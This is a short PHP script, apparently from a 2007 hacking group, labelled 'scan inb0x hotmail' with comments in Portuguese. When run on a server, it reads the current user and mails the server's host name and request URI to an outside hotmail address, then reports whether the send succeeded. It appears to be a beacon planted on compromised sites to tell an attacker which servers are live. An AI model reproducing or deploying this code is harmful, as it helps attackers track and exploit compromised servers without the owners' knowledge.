<?php
//=================================
//
//    scan inb0x hotmail v1.0
//
//  coded by FilhOte_Ccs and LOST
//      n�o rippem fdps :]
//
//
//      Hacker Group 2007
//=================================
//
 ini_set("max_execution_time",-1);
 set_time_limit(0);
 $user = @get_current_user();
 $email = "$user";
 $assunto = "InBoX SUBZID!";
 $email1 = "scytho@hotmail.com";
 $email2 = "cjsete@gmail.com";
 $headers  = "From: <$email>\r\n";


 if(mail($email1, $assunto, $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'], $headers)){
 echo "Opa, enviado!";
 exit();
 }
 else{
 echo "N�o enviei..";
 exit();
 }
?>

